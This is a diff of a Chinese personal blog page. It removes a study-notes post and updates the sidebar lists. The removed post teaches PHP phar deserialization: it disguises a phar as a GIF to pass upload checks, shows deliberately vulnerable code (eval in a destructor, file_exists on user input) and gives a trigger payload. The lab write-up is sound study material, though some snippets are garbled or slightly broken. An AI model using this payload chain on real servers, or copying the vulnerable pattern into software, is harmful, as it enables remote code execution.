</span><br><span class="line">                    f[i].<span class="built_in">set</span>(pf, <span class="string">&quot;hehe&quot;</span>); //修改成员值   </span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;   </span><br><span class="line">                    f[i].setInt(pf, 55);   </span><br><span class="line">                &#125;   </span><br><span class="line">                   </span><br><span class="line">            &#125;   </span><br><span class="line">            //重新打印修改后的成员值，final域值不变   </span><br><span class="line">            pf.print();   </span><br><span class="line">        &#125; catch (Exception e) &#123;   </span><br><span class="line">            e.printStackTrace();   </span><br><span class="line">        &#125;    </span><br><span class="line">        /*打印输出的结果  </span><br><span class="line">         *  RefImpl  </span><br><span class="line">            public method f()</span><br></pre></td></tr></table></figure>
-<p>六．字符逃逸<br>1.无法直接打出来的字符<br>2.例如控制字符，特殊字符<br>用“ \ ”开头后加另一个字符=逃逸字符</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\b——回退一格</span><br></pre></td></tr></table></figure>
-<p>1.不是删除</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">	System.out.println(<span class="string">&quot;abc\b&quot;</span>);</span><br><span class="line">```eclipse输出abc </span><br><span class="line">workspace输出abc </span><br><span class="line">System.out.println(<span class="string">&quot;abc\bd&quot;</span>);</span><br><span class="line">eclipse输出abcd</span><br><span class="line">workspace输出abd</span><br><span class="line">```bash</span><br><span class="line">\t——到下一个表格位</span><br><span class="line">System.out.println(<span class="string">&quot;abc\t123&quot;</span>);</span><br><span class="line">		System.out.println(<span class="string">&quot;a\t123&quot;</span>);</span><br></pre></td></tr></table></figure>
-<p>输出：<br>abc ? ? ? ?123<br>a ? ? ? ? ? ?123</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\n,\r——回车换行</span><br></pre></td></tr></table></figure>
-<p>七．PHar反序列化<br>关于流包装<br>大多数PHP文件操作允许使用各种URL协议去访问文件路径：如data://，zlib://或php://。<br>phar://也是流包装的一种</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">phar原理</span><br><span class="line">a stub</span><br><span class="line">可以理解为一个标志，格式为xxx&lt;?php xxx;__HALT_COMPILER();?&gt;，前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。</span><br></pre></td></tr></table></figure>
-<p>phar原理<br>a stub<br>可以理解为一个标志，格式为xxx<?php xxx;__HALT_COMPILER();?>，前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
-<p>demo<br>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作<br>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。<br>phar.php:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class TestObject &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = new Phar(<span class="string">&quot;phar.phar&quot;</span>); //后缀名必须为phar</span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); //设置stub</span><br><span class="line">    <span class="variable">$o</span> = new TestObject();</span><br><span class="line">    <span class="variable">$o</span> -&gt; data=<span class="string">&#x27;hu3sky&#x27;</span>;</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); //将自定义的meta-data存入manifest</span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); //添加要压缩的文件</span><br><span class="line">    //签名自动计算</span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>访问后,会生成一个phar.phar<br>用winhex打开<br>可以明显的看到meta-data是以序列化的形式存储的。<br>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化<br>phar_fan.php</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class TestObject&#123;</span><br><span class="line">    <span class="keyword">function</span> __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$this</span> -&gt; data;   // TODO: Implement __destruct() method.</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">include(<span class="string">&#x27;phar://phar.phar&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hu3sky</span><br></pre></td></tr></table></figure>
-<p>将phar伪造成其他格式的文件<br>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT_COMPILER();?&gt;这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class TestObject &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = new Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; startBuffering();</span><br><span class="line">    <span class="variable">$phar</span> -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);   //设置stub，增加gif文件头</span><br><span class="line">    <span class="variable">$phar</span> -&gt;addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);  //添加要压缩的文件</span><br><span class="line">    <span class="variable">$object</span> = new TestObject();</span><br><span class="line">    <span class="variable">$object</span> -&gt; data = <span class="string">&#x27;hu3sky&#x27;</span>;</span><br><span class="line">    <span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$object</span>);  //将自定义meta-data存入manifest</span><br><span class="line">    <span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>采用这种方法可以绕过很大一部分上传检测。<br>利用条件<br>phar文件要能够上传到服务器端。<br>如file_exists()，fopen()，file_get_contents()，file()等文件操作的函数<br>要有可用的魔术方法作为“跳板”。<br>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。<br>漏洞验证<br>环境准备<br>upload_file.php，后端检测文件上传，文件类型是否为gif，文件后缀名是否为gif<br>upload_file.html 文件上传表单<br>file_un.php 存在file_exists()，并且存在__destruct()<br>文件内容<br>upload_file.php</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/gif&quot;</span>)&amp;&amp;(substr(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], strrpos(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+1))== <span class="string">&#x27;gif&#x27;</span>) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Upload: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Type: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Temp file: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">&quot;upload_file/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="built_in">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">      move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],</span><br><span class="line">      <span class="string">&quot;upload_file/&quot;</span> .<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;Stored in: &quot;</span> . <span class="string">&quot;upload_file/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Invalid file,you can only upload gif&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-<p>upload_file.html</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;http://localhost/upload_file.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;Upload&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
-<p>file_un.php</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">class AnyClass&#123;</span><br><span class="line">    var <span class="variable">$output</span> = <span class="string">&#x27;echo &quot;ok&quot;;&#x27;</span>;</span><br><span class="line">    <span class="keyword">function</span> __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">eval</span>(<span class="variable">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure>
-<p>实现过程<br>首先是根据file_un.php写一个生成phar的php文件，当然需要绕过gif，所以需要加GIF89a，然后我们访问这个php文件后，生成了phar.phar，修改后缀为gif，上传到服务器，然后利用file_exists，使用phar://执行代码<br>构造代码<br>eval.php</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class AnyClass&#123;</span><br><span class="line">    var <span class="variable">$output</span> = <span class="string">&#x27;echo &quot;ok&quot;;&#x27;</span>;</span><br><span class="line">    <span class="keyword">function</span> __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">eval</span>(<span class="variable">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = new Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line"><span class="variable">$phar</span> -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$object</span> = new AnyClass();</span><br><span class="line"><span class="variable">$object</span> -&gt; output= <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$object</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br></pre></td></tr></table></figure>
-<p>访问eval.php，会在当前目录生成phar.phar，然后修改后缀 gif<br>然后利用file_un.php。<br>payload:filename=phar://upload_file/phar.gif</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">```bash</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">```bash</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">```bash</span><br></pre></td></tr></table></figure>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://ggken753.github.io/2020/10/08/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="ckg0haxoj0000lgv3fejddaxj" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -1500,7 +1357,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
     </div>
   </div>
 
@@ -1513,6 +1370,14 @@
       <ul>
         
           <li>
+            <a href="/2020/12/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B010/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2020/12/11/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B09/">linux一些小知识</a>
+          </li>
+        
+          <li>
             <a href="/2020/11/26/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08/">90道MISC部分</a>
           </li>
         
@@ -1522,14 +1387,6 @@
         
           <li>
             <a href="/2020/11/19/%E6%B5%B7%E5%95%B8%E6%9D%AFwp/">海啸杯wp</a>
-          </li>
-        
-          <li>
-            <a href="/2020/11/17/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06/">漏洞</a>
-          </li>
-        
-          <li>
-            <a href="/2020/11/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05/">SQL注入</a>
           </li>
         
       </ul>
